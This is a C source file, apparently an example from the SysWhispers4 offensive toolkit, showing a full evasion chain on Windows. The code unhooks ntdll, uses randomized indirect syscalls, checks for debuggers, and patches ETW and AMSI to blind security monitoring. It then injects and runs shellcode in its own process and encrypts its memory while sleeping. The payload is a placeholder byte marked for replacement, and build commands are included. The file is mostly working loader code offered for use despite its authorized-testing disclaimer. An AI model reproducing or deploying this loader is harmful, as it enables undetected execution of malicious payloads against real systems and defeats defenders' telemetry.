/*
 * SysWhispers4 — Example: Full Evasion Combo
 *
 * FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
 * Unauthorized use against systems you do not own is illegal.
 *
 * Demonstrates the recommended initialization order when combining
 * all available SysWhispers4 evasion features:
 *
 *   1. Unhook ntdll      — remap clean .text from KnownDlls
 *   2. Initialize SW4     — resolve SSNs from clean ntdll
 *   3. Anti-debug check   — verify no debugger attached
 *   4. Patch ETW          — suppress user-mode telemetry
 *   5. Patch AMSI         — bypass AmsiScanBuffer
 *   6. Inject payload     — using indirect syscalls
 *   7. Sleep encrypt      — encrypt memory during sleep
 *
 * Generated with:
 *   python syswhispers.py --preset stealth --method randomized --resolve recycled \
 *       --obfuscate --encrypt-ssn --stack-spoof --etw-bypass --amsi-bypass \
 *       --unhook-ntdll --anti-debug --sleep-encrypt
 *
 * Compile (MSVC):
 *   cl /nologo /W3 example_evasion_combo.c SW4Syscalls.c SW4Syscalls.asm
 *
 * Compile (MinGW):
 *   x86_64-w64-mingw32-gcc -masm=intel example_evasion_combo.c SW4Syscalls.c SW4Syscalls_stubs.c -o evasion.exe
 */
#include <stdio.h>
#include <string.h>
#include "SW4Syscalls.h"

/* Placeholder shellcode — replace with your payload */
static const unsigned char shellcode[] = {
    0xCC, /* int3 — breakpoint for testing */
};

static BOOL inject_into_self(void) {
    NTSTATUS status;

    /* Allocate RWX memory in our own process */
    PVOID  base = NULL;
    SIZE_T size = sizeof(shellcode);
    status = SW4_NtAllocateVirtualMemory(
        (HANDLE)-1,     /* NtCurrentProcess */
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Allocated %llu bytes at 0x%p\n",
           (unsigned long long)size, base);

    /* Write payload */
    SIZE_T written = 0;
    status = SW4_NtWriteVirtualMemory(
        (HANDLE)-1,
        base,
        (PVOID)shellcode,
        sizeof(shellcode),
        &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
        return FALSE;
    }

    /* Change protection to RX (W^X: never leave RWX) */
    ULONG oldProt = 0;
    status = SW4_NtProtectVirtualMemory(
        (HANDLE)-1,
        &base,
        &size,
        PAGE_EXECUTE_READ,
        &oldProt
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtProtectVirtualMemory failed: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Memory protection changed to RX\n");

    /* Flush instruction cache before executing */
    SW4_NtFlushInstructionCache((HANDLE)-1, base, sizeof(shellcode));

    /* Create thread to execute payload in our own process */
    HANDLE hThread = NULL;
    status = SW4_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        (HANDLE)-1,     /* NtCurrentProcess */
        base,           /* StartRoutine */
        NULL,           /* Argument */
        0,              /* CreateFlags — run immediately */
        0, 0, 0,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Payload thread created (handle 0x%p)\n", hThread);

    /* Wait for payload thread */
    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
    SW4_NtClose(hThread);

    return TRUE;
}

int main(void) {
    printf("=== SysWhispers4 Full Evasion Combo ===\n\n");

    /*
     * STEP 1: Unhook ntdll FIRST
     *
     * This remaps the .text section of ntdll.dll from a clean copy
     * obtained via KnownDlls. Must happen BEFORE SW4_Initialize()
     * so that SSN resolution reads clean, unhooked stubs.
     */
    printf("[*] Step 1: Unhooking ntdll...\n");
    if (!SW4_UnhookNtdll()) {
        fprintf(stderr, "[!] SW4_UnhookNtdll failed — EDR hooks may still be active\n");
        fprintf(stderr, "[*] Continuing anyway (some techniques may still work)\n");
    } else {
        printf("[+] ntdll .text section restored from clean copy\n");
    }

    /*
     * STEP 2: Initialize SysWhispers4
     *
     * Resolves SSNs and (for indirect/randomized) locates syscall;ret
     * gadgets in ntdll. With unhooking done first, this reads clean stubs.
     */
    printf("[*] Step 2: Initializing SysWhispers4...\n");
    if (!SW4_Initialize()) {
        fprintf(stderr, "[!] SW4_Initialize failed\n");
        return 1;
    }
    printf("[+] SSNs resolved, syscall gadgets located\n");

    /*
     * STEP 3: Anti-debug check
     *
     * Checks multiple indicators: PEB.BeingDebugged, NtGlobalFlag,
     * heap flags, NtQueryInformationProcess(DebugPort), timing checks,
     * and instrumentation callbacks.
     */
    printf("[*] Step 3: Anti-debug check...\n");
    if (!SW4_AntiDebugCheck()) {
        fprintf(stderr, "[!] Debugger detected — aborting\n");
        return 1;
    }
    printf("[+] No debugger detected\n");

    /*
     * STEP 4: Patch ETW
     *
     * Patches EtwEventWrite in ntdll to return immediately,
     * suppressing user-mode ETW telemetry that EDRs consume.
     */
    printf("[*] Step 4: Patching ETW...\n");
    if (!SW4_PatchEtw()) {
        fprintf(stderr, "[!] ETW patch failed (non-fatal)\n");
    } else {
        printf("[+] ETW user-mode writer patched\n");
    }

    /*
     * STEP 5: Patch AMSI
     *
     * Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN,
     * bypassing in-process script/payload scanning.
     */
    printf("[*] Step 5: Patching AMSI...\n");
    if (!SW4_PatchAmsi()) {
        fprintf(stderr, "[!] AMSI patch failed (non-fatal, AMSI may not be loaded)\n");
    } else {
        printf("[+] AmsiScanBuffer patched\n");
    }

    /*
     * STEP 6: Execute payload
     *
     * All evasion layers are now active. Syscalls use randomized
     * indirect invocation — each call jumps through a different
     * syscall;ret gadget in ntdll, making RIP analysis unreliable.
     */
    printf("[*] Step 6: Injecting payload (self-injection demo)...\n");
    if (!inject_into_self()) {
        fprintf(stderr, "[!] Payload injection failed\n");
        return 1;
    }
    printf("[+] Payload executed successfully\n");

    /*
     * STEP 7: Sleep with memory encryption
     *
     * Encrypts the current module's .text section with XOR during
     * sleep, then decrypts on wake. Prevents memory scanners from
     * finding payload signatures while sleeping.
     */
    printf("[*] Step 7: Sleeping with memory encryption (3 seconds)...\n");
    SW4_SleepEncrypt(3000);
    printf("[+] Woke up — memory decrypted\n");

    printf("\n=== Evasion combo complete ===\n");
    return 0;
}
